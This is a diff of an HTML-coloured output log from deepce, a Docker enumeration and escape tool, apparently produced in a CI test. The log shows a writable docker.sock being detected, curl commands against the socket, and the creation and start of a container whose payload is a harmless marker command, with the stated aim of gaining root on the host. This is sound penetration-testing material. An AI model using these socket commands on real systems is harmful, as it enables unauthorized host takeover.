@@ -43,34 +43,35 @@ See </span><span style="text-decoration:underline;font-weight:bold;">https://ste
 <span style="color:#3333FF;font-weight:bold;">===================================</span><span style="color:lime;font-weight:bold;">( Installing Packages )</span><span style="color:#3333FF;font-weight:bold;">====================================</span>
 fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
 fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.gz
-(1/25) Installing fstrm (0.6.0-r1)
-(2/25) Installing libgcc (9.3.0-r2)
-(3/25) Installing krb5-conf (1.0-r2)
-(4/25) Installing libcom_err (1.45.6-r0)
-(5/25) Installing keyutils-libs (1.6.1-r1)
-(6/25) Installing libverto (0.3.1-r1)
-(7/25) Installing krb5-libs (1.18.2-r0)
-(8/25) Installing json-c (0.14-r1)
-(9/25) Installing libstdc++ (9.3.0-r2)
-(10/25) Installing libprotobuf (3.12.2-r0)
-(11/25) Installing libprotoc (3.12.2-r0)
-(12/25) Installing protobuf-c (1.3.3-r1)
-(13/25) Installing xz-libs (5.2.5-r0)
-(14/25) Installing libxml2 (2.9.10-r4)
-(15/25) Installing bind-libs (9.14.12-r0)
-(16/25) Installing bind-tools (9.14.12-r0)
-(17/25) Installing ca-certificates (20191127-r4)
-(18/25) Installing nghttp2-libs (1.41.0-r0)
-(19/25) Installing libcurl (7.69.1-r0)
-(20/25) Installing curl (7.69.1-r0)
-(21/25) Installing lua5.3-libs (5.3.5-r6)
-(22/25) Installing libpcap (1.9.1-r2)
-(23/25) Installing pcre (8.44-r0)
-(24/25) Installing libssh2 (1.9.0-r1)
-(25/25) Installing nmap (7.80-r2)
+(1/26) Installing fstrm (0.6.0-r1)
+(2/26) Installing libgcc (9.3.0-r2)
+(3/26) Installing krb5-conf (1.0-r2)
+(4/26) Installing libcom_err (1.45.6-r0)
+(5/26) Installing keyutils-libs (1.6.1-r1)
+(6/26) Installing libverto (0.3.1-r1)
+(7/26) Installing krb5-libs (1.18.2-r0)
+(8/26) Installing json-c (0.14-r1)
+(9/26) Installing libstdc++ (9.3.0-r2)
+(10/26) Installing libprotobuf (3.12.2-r0)
+(11/26) Installing libprotoc (3.12.2-r0)
+(12/26) Installing protobuf-c (1.3.3-r1)
+(13/26) Installing libuv (1.37.0-r0)
+(14/26) Installing xz-libs (5.2.5-r0)
+(15/26) Installing libxml2 (2.9.10-r5)
+(16/26) Installing bind-libs (9.16.6-r0)
+(17/26) Installing bind-tools (9.16.6-r0)
+(18/26) Installing ca-certificates (20191127-r4)
+(19/26) Installing nghttp2-libs (1.41.0-r0)
+(20/26) Installing libcurl (7.69.1-r1)
+(21/26) Installing curl (7.69.1-r1)
+(22/26) Installing lua5.3-libs (5.3.5-r6)
+(23/26) Installing libpcap (1.9.1-r2)
+(24/26) Installing pcre (8.44-r0)
+(25/26) Installing libssh2 (1.9.0-r1)
+(26/26) Installing nmap (7.80-r2)
 Executing busybox-1.31.1-r16.trigger
 Executing ca-certificates-20191127-r4.trigger
-OK: 32 MiB in 39 packages
+OK: 33 MiB in 40 packages
 <span style="color:#3333FF;font-weight:bold;">===================================</span><span style="color:lime;font-weight:bold;">( Enumerating Platform )</span><span style="color:#3333FF;font-weight:bold;">===================================</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Inside Container ........ </span><span style="color:yellow;font-weight:bold;">Yes</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Platform ...... </span><span style="color:yellow;font-weight:bold;">docker</span>
@@ -79,7 +80,7 @@ OK: 32 MiB in 39 packages
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Groups .................. </span><span style="font-weight:bold;"></span><span style="color:white;font-weight:bold;"></span><span style="color:white;background-color:black;font-weight:bold;text-decoration:blink;">root</span><span style="font-weight:bold;"> bin daemon sys adm disk </span><span style="color:white;font-weight:bold;"></span><span style="color:white;background-color:black;font-weight:bold;text-decoration:blink;">wheel</span><span style="font-weight:bold;"> floppy dialout tape video</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Executable ....... </span><span style="font-weight:bold;">Not Found</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Sock ............. </span><span style="color:yellow;font-weight:bold;">Yes</span>
-<span style="color:white;font-weight:bold;">srw-rw----    1 root     116            0 Aug  6 11:53 /var/run/docker.sock</span>
+<span style="color:white;font-weight:bold;">srw-rw----    1 root     116            0 Sep 20 09:53 /var/run/docker.sock</span>
 
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Sock is writable ........ </span><span style="background-color:black;font-weight:bold;text-decoration:blink;">Yes</span>
 <span style="font-weight:bold;">The docker sock is writable, we should be able to enumerate docker, create containers 
@@ -90,8 +91,8 @@ See </span><span style="text-decoration:underline;font-weight:bold;">https://ste
 
 <span style="font-weight:bold;">curl -s --unix-socket /var/run/docker.sock http://localhost/info</span>
 
-<span style="color:white;font-weight:bold;">KernelVersion:5.3.0-1032-azure
-OperatingSystem:Ubuntu 18.04.4 LTS
+<span style="color:white;font-weight:bold;">KernelVersion:5.4.0-1025-azure
+OperatingSystem:Ubuntu 18.04.5 LTS
 OSType:linux
 Architecture:x86_64
 NCPU:2
@@ -102,14 +103,14 @@ ServerVersion:19.03.12+azure</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CVE–2019–13139 .......... </span><span style="font-weight:bold;">No</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CVE–2019–5736 ........... </span><span style="font-weight:bold;">No</span>
 <span style="color:#3333FF;font-weight:bold;">==================================</span><span style="color:lime;font-weight:bold;">( Enumerating Container )</span><span style="color:#3333FF;font-weight:bold;">===================================</span>
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container ID ............ </span><span style="color:yellow;font-weight:bold;">21e97d9cc34d</span>
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Full ID ....... </span><span style="color:yellow;font-weight:bold;">21e97d9cc34d59a4645c26436362df6a20611b0f3d20b2872ed0332ccd96fe56</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container ID ............ </span><span style="color:yellow;font-weight:bold;">b4daa16293c2</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Full ID ....... </span><span style="color:yellow;font-weight:bold;">b4daa16293c24060680df5fc47d29821d68949c63c2694cecb7b63d84e34b27e</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Name .......... </span><span style="color:red;font-weight:bold;">Could not get container name through reverse DNS</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container IP ............ </span><span style="color:yellow;font-weight:bold;">172.17.0.2</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> DNS Server(s) ........... </span><span style="color:yellow;font-weight:bold;">168.63.129.16 </span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Host IP ................. </span><span style="color:yellow;font-weight:bold;">172.17.0.1</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Operating System ........ </span><span style="font-weight:bold;">Linux</span>
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Kernel .................. </span><span style="font-weight:bold;">5.3.0-1032-azure</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Kernel .................. </span><span style="font-weight:bold;">5.4.0-1025-azure</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Arch .................... </span><span style="font-weight:bold;">x86_64</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CPU ..................... </span><span style="font-weight:bold;">Intel(R) Xeon(R) Platinum 8171M CPU @ 2.60GHz</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Useful tools installed .. </span><span style="color:yellow;font-weight:bold;">Yes</span>
@@ -132,12 +133,12 @@ and obtain root privs on the host machine
 See </span><span style="text-decoration:underline;font-weight:bold;">https://stealthcopter.github.io/deepce/guides/docker-sock.md</span>
 
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Other mounts .............. </span><span style="color:yellow;font-weight:bold;">Yes</span>
-<span style="font-weight:bold;">/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/sda1 rw,discard</span>
+<span style="font-weight:bold;">/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/sdb1 rw,discard</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Possible host usernames ... </span><span style="color:yellow;font-weight:bold;">runner </span>
 <span style="color:#3333FF;font-weight:bold;">====================================</span><span style="color:lime;font-weight:bold;">( Interesting Files )</span><span style="color:#3333FF;font-weight:bold;">=====================================</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Interesting environment variables ... </span><span style="font-weight:bold;">No</span>
 <span style="font-weight:bold;">HOME=/root
-HOSTNAME=21e97d9cc34d
+HOSTNAME=b4daa16293c2
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 PWD=/
 SHLVL=1</span>
@@ -159,13 +160,13 @@ host machine, this can be used to enumerate further</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Custom Command ........... </span><span style="font-weight:bold;">touch /tmp/deepce-docker-alpine-payload-command.hacked</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Clean up ................. </span><span style="font-weight:bold;">Automatic on container exit</span>
 
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Creating container ..... </span><span style="color:yellow;font-weight:bold;">20ef33227030a9f52eca707c2bc152581d2a20c919f4694d29263ce889be799f</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Creating container ..... </span><span style="color:yellow;font-weight:bold;">27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> If the shell dies you can restart your listener and run the start command to fire it again </span>
-<span style="font-weight:bold;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/20ef33227030a9f52eca707c2bc152581d2a20c919f4694d29263ce889be799f/start</span>
-<span style="font-weight:bold;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/20ef33227030a9f52eca707c2bc152581d2a20c919f4694d29263ce889be799f/logs?stderr=1&amp;stdout=1&quot; --output -</span>
+<span style="font-weight:bold;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a/start</span>
+<span style="font-weight:bold;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a/logs?stderr=1&amp;stdout=1&quot; --output -</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Once complete remember to tidy up by stopping and removing your container with following commands </span>
-<span style="font-weight:bold;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/20ef33227030a9f52eca707c2bc152581d2a20c919f4694d29263ce889be799f/stop</span>
-<span style="font-weight:bold;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/20ef33227030a9f52eca707c2bc152581d2a20c919f4694d29263ce889be799f</span>
+<span style="font-weight:bold;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a/stop</span>
+<span style="font-weight:bold;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/27c805412627aa98a9f86897278b2303fc6e8a8e035981717f6e39fb02a53a3a</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Starting container ..... </span><span style="color:yellow;font-weight:bold;">Success</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Sleeping for ........... </span><span style="font-weight:bold;">2s</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Fetching logs .......... </span><span style="color:yellow;font-weight:bold;">Success</span>
